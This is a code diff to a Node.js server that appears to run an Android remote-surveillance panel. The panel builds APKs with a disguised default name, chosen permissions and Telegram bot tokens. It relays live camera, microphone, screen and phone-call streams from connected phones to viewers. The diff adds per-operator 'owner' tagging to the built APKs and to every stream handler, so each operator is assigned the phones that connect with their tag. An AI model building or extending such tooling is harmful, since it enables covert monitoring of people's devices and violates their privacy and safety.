@@ -94,6 +94,12 @@ function getSessionUser(req) {
   return s;
 }
 function isAdmin(req) { const s = getSessionUser(req); return s ? !!(usersDb[s.username]?.admin) : false; }
+function _autoAssignOwner(ip, ownerUsername) {
+  if (!ownerUsername) return;
+  if (!usersDb[ownerUsername] || usersDb[ownerUsername].admin) return;
+  if (registry[ip]?.owner === ownerUsername) return; // уже назначен
+  regTouch(ip, { owner: ownerUsername });
+}
 function _canViewPhone(username, ip) {
   if (!username) return false;
   if (usersDb[username]?.admin) return true;
@@ -308,6 +314,7 @@ app.post('/api/build/apk', iconUpload.single('icon'), h(async (req, res) => {
     applicationId: req.body.applicationId,
     permissions: (req.body.permissions || 'CAMERA').split(',').map((s) => s.trim()).filter(Boolean),
     defaultServer: req.body.defaultServer,
+    ownerUsername: req.body.ownerUsername || '',
   };
   try {
     const { apkPath, fileName } = await builder.buildApk(cfg, req.file?.path);
@@ -403,7 +410,7 @@ function ghFetch(url, token, opts = {}) {
 }
 
 app.post('/api/build/github', h(async (req, res) => {
-  const { appName, applicationId, defaultServer, permissions, token, tgToken, tgChatId } = req.body;
+  const { appName, applicationId, defaultServer, ownerUsername, permissions, token, tgToken, tgChatId } = req.body;
   if (!token) return res.status(400).json({ error: 'GitHub token required' });
   const permList = (permissions || '').split(',').map((s) => s.trim()).filter(Boolean);
 
@@ -419,6 +426,7 @@ app.post('/api/build/github', h(async (req, res) => {
           app_name: appName || 'Camera Companion',
           application_id: applicationId || 'com.artem.cameracompanion',
           default_server: defaultServer || '',
+          owner_username: ownerUsername || '',
           permissions: permList.join(','),
           tg_token: tgToken || '',
           tg_chat_id: tgChatId || '',
@@ -671,10 +679,12 @@ wssCamera.on('connection', (ws, req) => {
   const role = params.get('role') || 'viewer';
   const cam = params.get('cam') || 'back';
   const model = params.get('model') || '';
+  const owner = params.get('owner') || '';
   const ip = normalizeIp(req.socket.remoteAddress);
   console.log(`[CAM] connected: role=${role} cam=${cam} from ${ip}`);
 
   if (role === 'phone') {
+    _autoAssignOwner(ip, owner);
     const phone = getPhone(ip, model);
     phone[cam] = ws;
     if (!activePhoneIp) activePhoneIp = ip;
@@ -730,10 +740,12 @@ wssAudio.on('connection', (ws, req) => {
   const params = new URL(req.url, 'http://localhost').searchParams;
   const role = params.get('role') || 'viewer';
   const model = params.get('model') || '';
+  const owner = params.get('owner') || '';
   const ip = normalizeIp(req.socket.remoteAddress);
   console.log(`[AUDIO] connected: role=${role} from ${ip}`);
 
   if (role === 'phone') {
+    _autoAssignOwner(ip, owner);
     const phone = getPhone(ip, model);
     phone.audio = ws;
     if (!activePhoneIp) activePhoneIp = ip;
@@ -839,10 +851,12 @@ wssScreen.on('connection', (ws, req) => {
   const params = new URL(req.url, 'http://localhost').searchParams;
   const role = params.get('role') || 'viewer';
   const model = params.get('model') || '';
+  const owner = params.get('owner') || '';
   const ip = normalizeIp(req.socket.remoteAddress);
   console.log(`[SCREEN] connected: role=${role} from ${ip}`);
 
   if (role === 'phone') {
+    _autoAssignOwner(ip, owner);
     screenPhones.set(ip, ws);
     for (const v of screenViewers) {
       if (v.readyState === v.OPEN) v.send(JSON.stringify({ type: 'screen-phone', connected: true }));
@@ -946,10 +960,12 @@ app.get('/api/dl', (req, res) => {
 wssPhone.on('connection', (ws, req) => {
   const params = new URL(req.url, 'http://localhost').searchParams;
   const role = params.get('role') || 'viewer';
+  const owner = params.get('owner') || '';
   const ip = normalizeIp(req.socket.remoteAddress);
   console.log(`[PHONE] connected: role=${role} from ${ip}`);
 
   if (role === 'phone') {
+    _autoAssignOwner(ip, owner);
     phoneCallPhones.set(ip, ws);
     regTouch(ip, { online: true, lastSeen: Date.now(), deleted: false });
     for (const v of phoneCallViewers) {
